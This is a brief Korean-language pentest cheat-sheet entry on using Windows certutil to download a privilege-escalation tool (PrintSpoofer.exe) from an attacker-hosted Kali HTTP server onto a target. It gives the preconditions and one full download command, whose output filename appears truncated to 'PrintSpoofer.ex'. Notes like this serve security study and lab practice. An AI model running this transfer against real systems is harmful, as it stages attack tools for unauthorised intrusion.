> 무엇: Windows 내장 certutil -urlcache -f로 원격 URL의 파일(PrintSpoofer.exe 등)을 타깃 로컬 디스크에 내려받는 명령
> 언제: Kali http.server에서 도구 바이너리를 서빙해 둔 상태로 Windows 타깃에 파일을 전송할 때, 실행 출력으로 성공 여부가 눈에 보인다(IWR과의 차이)
> 조건: 타깃에서 명령 실행 가능, 공격자 HTTP 서버로의 아웃바운드 허용, 쓰기 가능한 경로(C:\Temp 등) 필요

certutil -urlcache -f http://192.168.49.150/PrintSpoofer.exe C:\Temp\PrintSpoofer.ex
